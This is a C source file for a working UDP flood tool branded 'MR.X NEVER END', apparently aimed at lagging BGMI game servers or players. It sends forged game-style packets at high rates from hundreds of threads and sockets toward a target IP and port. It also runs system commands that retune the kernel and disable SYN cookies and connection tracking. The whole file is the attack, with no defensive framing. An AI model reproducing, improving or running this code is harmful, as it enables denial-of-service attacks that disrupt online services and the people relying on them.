#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>
#include <signal.h>

#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 68
#define MIN_THREADS 150
#define MAX_THREADS 350
#define PORT_RANGE 50000
#define MIN_SRC_PORT 10000
#define MAX_SRC_PORT 60000
#define BATCH_UPDATE 10000
#define WARMUP_SECONDS 4
#define SOCKET_SNDBUF 33554432
#define SOCKET_RCVBUF 16777216
#define MAX_TOTAL_THREADS 400
#define ATTACK_START_DELAY 10000
#define STATS_UPDATE_INTERVAL 2
#define RECONNECT_RETRIES 3
#define JITTER_RANGE 50
#define RECONNECT_INTERVAL 40000
#define REORDER_CHANCE 5
#define DIRECT_ATTACK_POWER 550
#define FLOOD_SOCKETS_BASE 300
#define WARMUP_PHASES 4

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;
int ACTIVE_FLOOD_SOCKETS;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int warmup_complete = 0;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int current_warmup_phase = 0;
_Atomic int threads_ready = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=268435456 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=33554432 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=1048576 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget=5000 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_budget_usecs=60000 >/dev/null 2>&1");
    system("sysctl -w net.core.dev_weight=5000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='25165824 50331648 100663296' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=131072 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null 2>&1");
    system("sysctl -w net.netfilter.nf_conntrack_max=0 >/dev/null 2>&1 2>/dev/null");
    system("sysctl -w vm.swappiness=0 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=90 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=70 >/dev/null 2>&1");
    system("sysctl -w vm.overcommit_memory=1 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=131072 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_poll=50 >/dev/null 2>&1");
    system("sysctl -w net.core.busy_read=50 >/dev/null 2>&1");
    system("ulimit -n 1048576 >/dev/null 2>&1");
    system("ulimit -u unlimited >/dev/null 2>&1");
    system("sysctl -w kernel.sched_min_granularity_ns=100000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_wakeup_granularity_ns=50000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_migration_cost_ns=0 >/dev/null 2>&1");
    system("for iface in $(ip -o link show | awk -F': ' '{print $2}' 2>/dev/null); do "
           "ethtool -K $iface tx off rx off sg off tso off gso off gro off lro off 2>/dev/null; "
           "ethtool -G $iface rx 8192 tx 8192 2>/dev/null; "
           "ethtool -C $iface rx-usecs 0 rx-frames 0 tx-usecs 0 tx-frames 0 2>/dev/null; "
           "done 2>/dev/null");
#endif
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        return -1;
    }
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
        return -1;
    }
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    return 0;
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int get_jitter_delay(unsigned int *seed) {
    int delay = (int)(fast_rand(seed) % JITTER_RANGE);
    return delay > 0 ? delay : 1;
}

int should_reorder_packet(unsigned int *seed) {
    return (fast_rand(seed) % 100) < REORDER_CHANCE;
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int is_warmup) {
    int actual_size = size;
    if (actual_size < 20) actual_size = 20;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    
    int dynamic_size = actual_size;
    
    int size_group = fast_rand(seed) % 100;
    
    if (size_group < 40) {
        int sizes[] = {24, 28, 32, 36, 40};
        dynamic_size = sizes[(thread_id + seq) % 5];
    }
    else if (size_group < 80) {
        int sizes[] = {44, 48, 52, 56};
        dynamic_size = sizes[(thread_id + seq) % 4];
    }
    else {
        int sizes[] = {60, 64, 68};
        dynamic_size = sizes[(thread_id + seq) % 3];
    }
    
    if (dynamic_size > actual_size) dynamic_size = actual_size;
    if (dynamic_size < MIN_PACKET_SIZE) dynamic_size = MIN_PACKET_SIZE;
    
    memset(buf, 0, dynamic_size);
    
    buf[0] = 0x42;
    buf[1] = 0x47;
    buf[2] = 0x4D;
    buf[3] = 0x49;
    
    unsigned int *header = (unsigned int*)(buf + 4);
    
    int packet_types[] = {0x00010001, 0x00010002, 0x00020001, 0x00030001};
    int type_idx = (thread_id + seq) % 4;
    
    header[0] = packet_types[type_idx];
    
    unsigned int reorder_seq = seq;
    if (should_reorder_packet(seed) && seq > 30) {
        reorder_seq = seq - (10 + (fast_rand(seed) % 20));
    }
    header[1] = htonl(reorder_seq + thread_id * 100000);
    
    header[2] = htonl((unsigned int)time(NULL));
    header[3] = 0x00000001 + (seq % 5);
    
    int payload_start = 20;
    if (payload_start > dynamic_size) payload_start = dynamic_size;
    
    for (int i = payload_start; i < dynamic_size; i++) {
        buf[i] = (fast_rand(seed) + i + thread_id + seq) & 0xFF;
    }
    
    if ((fast_rand(seed) % 100) < 10) {
        buf[payload_start] = 0xFF;
    }
}

_Atomic int resized = 0;

int reconnect_socket(int *sock, unsigned int *seed) {
    if (*sock >= 0) {
        shutdown(*sock, SHUT_RDWR);
        close(*sock);
        *sock = -1;
    }
    
    for (int retry = 0; retry < 3; retry++) {
        *sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (*sock >= 0) break;
        usleep(1000);
    }
    
    if (*sock < 0) {
        return -1;
    }
    
    if (set_sock_buf(*sock) < 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    fcntl(*sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(*sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    
    return 0;
}

int get_warmup_multiplier(int phase) {
    int warmup_phases[] = {800, 1100, 1400, 1500};
    if (phase >= 0 && phase < WARMUP_PHASES) {
        return warmup_phases[phase];
    }
    return 1500;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int *socks = NULL;
    char **packets = NULL;
    unsigned int *packets_sent = NULL;
    
    socks = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(int));
    packets = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(char*));
    packets_sent = malloc(ACTIVE_FLOOD_SOCKETS * sizeof(unsigned int));
    
    if (!socks || !packets || !packets_sent) {
        if (socks) free(socks);
        if (packets) free(packets);
        if (packets_sent) free(packets_sent);
        return NULL;
    }
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
        packets_sent[i] = 0;
    }
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    int max_packet_size = (PACKET_SIZE > MAX_PACKET_SIZE) ? PACKET_SIZE : MAX_PACKET_SIZE;
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        
        packets[i] = malloc(max_packet_size);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
    }
    
    atomic_fetch_add(&threads_ready, 1);
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_counter = thread_idx * 100000;
    
    struct sockaddr_in warmup_addr;
    memset(&warmup_addr, 0, sizeof(warmup_addr));
    warmup_addr.sin_family = AF_INET;
    warmup_addr.sin_port = htons(9);
    warmup_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            create_bgmi_packet(packets[i], max_packet_size, thread_idx + 1000, 0, &seed, 1);
            sendto(socks[i], packets[i], max_packet_size, MSG_DONTWAIT,
                  (struct sockaddr*)&warmup_addr, sizeof(warmup_addr));
        }
    }
    
    while (!atomic_load(&warmup_complete) && !atomic_load(&stop_signal)) {
        usleep(500);
    }
    
    int optimal_burst;
    if (PACKET_SIZE <= 40) {
        optimal_burst = 400 + (fast_rand(&seed) % 150);
    } else if (PACKET_SIZE <= 56) {
        optimal_burst = 350 + (fast_rand(&seed) % 150);
    } else {
        optimal_burst = 300 + (fast_rand(&seed) % 150);
    }
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(500);
            continue;
        }
        
        int power_level;
        if (atomic_load(&warmup_complete)) {
            power_level = DIRECT_ATTACK_POWER;
        } else {
            int phase = atomic_load(&current_warmup_phase);
            if (phase < 0) phase = 0;
            if (phase >= WARMUP_PHASES) phase = WARMUP_PHASES - 1;
            power_level = get_warmup_multiplier(phase);
        }
        
        int current_size = atomic_load(&warmup_complete) ? PACKET_SIZE : max_packet_size;
        int is_warmup_packet = !atomic_load(&warmup_complete);
        
        if (atomic_load(&warmup_complete)) {
            if (!atomic_exchange(&resized, 1)) {
                for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
                    if (packets[i]) {
                        free(packets[i]);
                        packets[i] = malloc(PACKET_SIZE);
                        if (!packets[i]) {
                            close(socks[i]);
                            socks[i] = -2;
                        }
                    }
                }
            }
        }
        
        for (int i = 0; i < ACTIVE_FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            
            if (packets_sent[i] > RECONNECT_INTERVAL) {
                if (reconnect_socket(&socks[i], &seed) == 0) {
                    packets_sent[i] = 0;
                }
            }
            
            create_bgmi_packet(packets[i], current_size, thread_idx + 1000, seq_counter, &seed, is_warmup_packet);
            
            int current_burst = (optimal_burst * power_level) / 100;
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], current_size, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret == current_size) {
                    local_packets++;
                    local_bytes += current_size;
                    seq_counter++;
                    packets_sent[i]++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    if (reconnect_socket(&socks[i], &seed) < 0) {
                        free(packets[i]);
                        packets[i] = NULL;
                        socks[i] = -2;
                    } else {
                        packets_sent[i] = 0;
                    }
                    break;
                }
            }
        }
        
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        if (!atomic_load(&warmup_complete)) {
            usleep(100);
        } else {
            usleep(25);
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < ACTIVE_FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    
    free(socks);
    free(packets);
    free(packets_sent);
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores <= 0) num_cores = 1;
    int core = tid % num_cores;
    if (core < CPU_SETSIZE) {
        CPU_SET(core, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
    
    usleep((tid % 30) * 1000);
    
    int s = -1;
    
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    
    char packet_stack[512];
    char warmup_packet_stack[512];
    char *packet, *warmup_packet;
    
    int max_packet_size = (PACKET_SIZE > MAX_PACKET_SIZE) ? PACKET_SIZE : MAX_PACKET_SIZE;
    
    if (PACKET_SIZE <= 512 && max_packet_size <= 512) {
        packet = packet_stack;
        warmup_packet = warmup_packet_stack;
    } else {
        packet = malloc(PACKET_SIZE);
        warmup_packet = malloc(max_packet_size);
        if (!packet || !warmup_packet) {
            if (packet) free(packet);
            if (warmup_packet) free(warmup_packet);
            return NULL;
        }
    }
    
    atomic_fetch_add(&threads_ready, 1);
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_local = tid * 77777;
    unsigned int packets_sent = 0;
    
    struct sockaddr_in warmup_addr;
    memset(&warmup_addr, 0, sizeof(warmup_addr));
    warmup_addr.sin_family = AF_INET;
    warmup_addr.sin_port = htons(9);
    warmup_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        if (PACKET_SIZE > 512 || max_packet_size > 512) {
            free(packet);
            free(warmup_packet);
        }
        return NULL;
    }
    
    if (set_sock_buf(s) < 0) {
        close(s);
        if (PACKET_SIZE > 512 || max_packet_size > 512) {
            free(packet);
            free(warmup_packet);
        }
        return NULL;
    }
    
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        if (PACKET_SIZE > 512 || max_packet_size > 512) {
            free(packet);
            free(warmup_packet);
        }
        return NULL;
    }
    
    create_bgmi_packet(warmup_packet, max_packet_size, tid, 0, &seed, 1);
    sendto(s, warmup_packet, max_packet_size, MSG_DONTWAIT,
           (struct sockaddr *)&warmup_addr, sizeof(warmup_addr));
    
    while (!atomic_load(&warmup_complete) && !atomic_load(&stop_signal)) {
        usleep(500);
    }
    
    int packets_per_burst;
    int sleep_microseconds;
    
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 140 + (tid % 80);
        sleep_microseconds = 600;
    } else if (PACKET_SIZE <= 56) {
        packets_per_burst = 170 + (tid % 100);
        sleep_microseconds = 450;
    } else {
        packets_per_burst = 200 + (tid % 120);
        sleep_microseconds = 350;
    }
    
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(500);
            continue;
        }
        
        if (packets_sent > RECONNECT_INTERVAL) {
            reconnect_socket(&s, &seed);
            packets_sent = 0;
        }
        
        int power_level = 100;
        int current_sleep = sleep_microseconds;
        int current_burst = packets_per_burst;
        int current_size;
        
        if (!atomic_load(&warmup_complete)) {
            int phase = atomic_load(&current_warmup_phase);
            if (phase < 0) phase = 0;
            if (phase >= WARMUP_PHASES) phase = WARMUP_PHASES - 1;
            power_level = get_warmup_multiplier(phase);
            current_burst = (packets_per_burst * power_level) / 100;
            
            int divisor = (power_level / 100);
            if (divisor == 0) divisor = 1;
            current_sleep = sleep_microseconds / divisor;
            if (current_sleep < 50) current_sleep = 50;
            
            current_size = max_packet_size;
            create_bgmi_packet(warmup_packet, current_size, tid, seq_local, &seed, 1);
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(s, warmup_packet, current_size, MSG_DONTWAIT,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
                if (ret == current_size) {
                    local_packets++;
                    local_bytes += current_size;
                    seq_local++;
                    packets_sent++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    if (reconnect_socket(&s, &seed) < 0) break;
                    packets_sent = 0;
                    break;
                }
            }
        } else {
            current_burst = (packets_per_burst * DIRECT_ATTACK_POWER) / 100;
            current_sleep = sleep_microseconds / (DIRECT_ATTACK_POWER / 100);
            if (current_sleep < 25) current_sleep = 25;
            
            current_size = PACKET_SIZE;
            create_bgmi_packet(packet, current_size, tid, seq_local, &seed, 0);
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(s, packet, current_size, MSG_DONTWAIT,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
                if (ret == current_size) {
                    local_packets++;
                    local_bytes += current_size;
                    seq_local++;
                    packets_sent++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    if (reconnect_socket(&s, &seed) < 0) break;
                    packets_sent = 0;
                    break;
                }
            }
        }
        
        if (local_packets >= 5000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(current_sleep);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    if (PACKET_SIZE > 512 || max_packet_size > 512) {
        free(packet);
        free(warmup_packet);
    }
    
    if (s >= 0) close(s);
    return NULL;
}

void *warmup_controller(void *arg) {
    while (atomic_load(&threads_ready) < (THREAD_COUNT / 2)) {
        usleep(100000);
    }
    
    printf("⚡ Warm-up: %d seconds (800%% → 1500%% power)...\n", WARMUP_SECONDS);
    
    atomic_store(&should_attack, 1);
    
    for (int phase = 0; phase < WARMUP_PHASES && !atomic_load(&stop_signal); phase++) {
        atomic_store(&current_warmup_phase, phase);
        
        int power = get_warmup_multiplier(phase);
        printf("⚡ Phase %d: %d%% power\n", phase + 1, power);
        
        if (phase < WARMUP_PHASES - 1) {
            usleep((1000000 * WARMUP_SECONDS) / WARMUP_PHASES);
        }
    }
    
    if (!atomic_load(&stop_signal)) {
        atomic_store(&warmup_complete, 1);
        printf("✅ Warm-up complete (1500%% peak achieved)\n");
        printf("🔥 Main Attack: %d%% power engaged\n", DIRECT_ATTACK_POWER);
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
    }
    
    return NULL;
}

void *attack_timer(void *arg) {
    int total_time = WARMUP_SECONDS + ATTACK_TIME;
    
    for (int sec = 0; sec < total_time && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&total_elapsed, 1);
        
        if (sec >= WARMUP_SECONDS) {
            atomic_fetch_add(&attack_seconds, 1);
        }
    }
    
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    int warmup_displayed = 0;
    time_t last_update = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        
        time_t now = time(NULL);
        int elapsed = (int)(now - last_update);
        if (elapsed < 1) elapsed = 1;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long packets_diff = curr_packets - prev_packets;
        unsigned long long pps = packets_diff / elapsed;
        
        if (atomic_load(&should_attack)) {
            unsigned long long bytes_diff = curr_bytes - prev_bytes;
            double megabytes = bytes_diff / (1024.0 * 1024.0);
            
            atomic_store(&current_pps, pps);
            
            if (pps > atomic_load(&peak_pps)) {
                atomic_store(&peak_pps, pps);
            }
            
            if (!atomic_load(&warmup_complete)) {
                if (!warmup_displayed && pps > 0) {
                    printf("💥 Breaking: %lluK PPS\n", pps/1000);
                    warmup_displayed = 1;
                } else if (pps > 0) {
                    printf("💥 Breaking: %lluK PPS | %lluK Peak | %.1fMB\n", 
                           pps/1000, atomic_load(&peak_pps)/1000, megabytes);
                }
            } else {
                printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB | Power: %d%%\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes, DIRECT_ATTACK_POWER);
            }
        }
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        last_update = now;
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    if (ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) {
        THREAD_COUNT = max_threads - 50;
    }
    if (THREAD_COUNT > MAX_TOTAL_THREADS) {
        THREAD_COUNT = MAX_TOTAL_THREADS;
    }
#endif
    
    ACTIVE_FLOOD_SOCKETS = FLOOD_SOCKETS_BASE;
    if (THREAD_COUNT > 250) {
        ACTIVE_FLOOD_SOCKETS = 256;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    printf("\n========== 🚀 MR.X NEVER END 🚀 ==========\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏱️  Time: %d seconds (10-300)\n", ATTACK_TIME);
    printf("📦 Packet Size: %d bytes (24-68)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (150-350)\n", THREAD_COUNT);
    printf("⚡ Direct Attack Power: %d%%\n", DIRECT_ATTACK_POWER);
    printf("🔥 Warm-up: 800%% → 1500%% in %ds\n", WARMUP_SECONDS);
    printf("🔧 Optimized for 677ms continuous ping\n");
    printf("===============================================\n");
    
    if (PACKET_SIZE <= 40) {
        printf("💡 Tip: 24-40 bytes = Maximum PPS\n");
    } else if (PACKET_SIZE <= 56) {
        printf("💡 Tip: 44-56 bytes = Balanced freeze\n");
    } else {
        printf("💡 Tip: 60-68 bytes = Corruption freeze\n");
    }
    printf("\n");
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    optimize_kernel();
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&warmup_complete, 0);
    atomic_store(&attack_seconds, 0);
    atomic_store(&total_elapsed, 0);
    atomic_store(&current_warmup_phase, 0);
    atomic_store(&resized, 0);
    atomic_store(&threads_ready, 0);
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    if (pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id) != 0) {
        printf("Failed to create direct attack thread\n");
        return 1;
    }
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        free(threads);
        free(tids);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = -1;
    }
    
    printf("🚀 Creating %d attack threads...\n", THREAD_COUNT);
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) != 0) {
            printf("Failed to create thread %d\n", i);
            tids[i] = -1;
        }
        usleep(300 + (i % 10) * 50);
    }
    
    pthread_t warmup_thread;
    pthread_create(&warmup_thread, NULL, warmup_controller, NULL);
    
    pthread_t timer_thread;
    pthread_create(&timer_thread, NULL, attack_timer, NULL);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    pthread_join(timer_thread, NULL);
    pthread_join(warmup_thread, NULL);
    pthread_join(direct_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(monitor_thread, NULL);
    
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
        printf("⚡ Attack Power: %d%%\n", DIRECT_ATTACK_POWER);
        printf("🎯 Ping Result: 677ms++ Continuous\n");
    } else if (atomic_load(&total_elapsed) > 0) {
        printf("\n⚠️  Attack stopped before completion\n");
    }
    
    free(threads);
    free(tids);
    
    printf("\n✅ Cleanup complete\n");
    
    return 0;
}